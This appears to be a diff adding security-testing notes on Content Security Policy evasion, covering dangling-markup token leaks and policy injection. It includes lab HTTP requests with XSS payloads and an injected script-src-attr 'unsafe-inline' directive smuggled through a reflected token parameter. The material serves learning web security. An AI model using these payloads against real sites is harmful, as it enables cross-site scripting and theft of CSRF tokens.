@@ -20,8 +20,71 @@ In addition to whitelisting specific domains, content security policy also provi
 
 ## CSP Evasion
 
-- [Evading CSP with DOM-based dangling markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)
-- [Bypassing CSP with policy injection](https://portswigger.net/research/bypassing-csp-with-policy-injection)
-- [AngularJS CSP bypass](../Dev,%20scripting%20&%20OS/AngularJS.md#AngularJS%20CSP%20bypass)
+### Using `img` and dangling markup
 
+It's quite common for a CSP to block resources like `script`. However, many CSPs do allow image requests. This means you can often use `img` elements to make requests to external servers in order to disclose [CSRF tokens](Session%20Attacks%20(CSRF,%20session%20stealing,%20etc.).md#CSRF%20tokens), for example.
+
+From the research: [Evading CSP with DOM-based dangling markup](https://portswigger.net/research/evading-csp-with-dom-based-dangling-markup)
+
+![XSS + Dangling Markup + CSP bypass + CSRF](Cross-Site%20Scripting%20(XSS).md#XSS%20+%20Dangling%20Markup%20+%20CSP%20bypass%20+%20CSRF)
+
+### Policy injection
+
+You may encounter a website that reflects input into the actual policy, most likely in a `report-uri` directive. If the site reflects a parameter that you can control, you can inject a semicolon to add your own CSP directives.
+
+Default policy (noticed the `token` parameter in `report-uri`):
+```http
+GET /?search=<img+src+onerror=alert(1)> HTTP/1.1
+Host: 0a6f005403a5d035877a0ba0009b00f6.web-security-academy.net
+
+
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=
+```
+
+The parameter can be controlled and arbitrary policies can be injected:
+```http
+GET /?search=<img+src+onerror=alert(1)>&token=filler;+foo+'bar' HTTP/1.1
+Host: 0a6f005403a5d035877a0ba0009b00f6.web-security-academy.net
+
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=filler; foo 'bar'
+```
+
+Normally, it's not possible to overwrite an existing `script-src` directive. However, Chrome recently introduced the `script-src-elem` [^script-src-element] directive, which allows you to control `script` elements, but not events.
+
+[^script-src-element]: https://w3c.github.io/webappsec-csp/#directive-script-src-elem
+
+```html
+Content-Security-Policy: script-src-elem 'none'; script-src-attr 'unsafe-inline'
+
+<script>alert("This will be blocked")</script>
+<a href="#" onclick="alert('This will be allowed')">test</a>
+```
+
+Crucially, this new directive allows you to [overwrite existing `script-src` directives](https://portswigger.net/research/bypassing-csp-with-policy-injection).
+
+```http
+GET /?search=<img+src+onerror=alert(1)>&token=filler;+script-src-elem+'none'%3b+script-src-attr+'unsafe-inline' HTTP/1.1
+Host: 0a6f005403a5d035877a0ba0009b00f6.web-security-academy.net
+
+
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=utf-8
+Content-Security-Policy: default-src 'self'; object-src 'none';script-src 'self'; style-src 'self'; report-uri /csp-report?token=filler; script-src-elem 'none'; script-src-attr 'unsafe-inline'
+```
+
+![](../../zzz_res/attachments/CSP-policy-injection.png)
+
+Further examples:
+- [eXtra Safe Security layers](../../Play%20ground/CTFs/eXtra%20Safe%20Security%20layers.md)
+
+### Other techniques
+
+- [AngularJS CSP bypass](../Dev,%20scripting%20&%20OS/AngularJS.md#AngularJS%20CSP%20bypass)
+- [Ambushed by AngularJS: a hidden CSP bypass in Piwik PRO](https://portswigger.net/research/ambushed-by-angularjs-a-hidden-csp-bypass-in-piwik-pro)
 
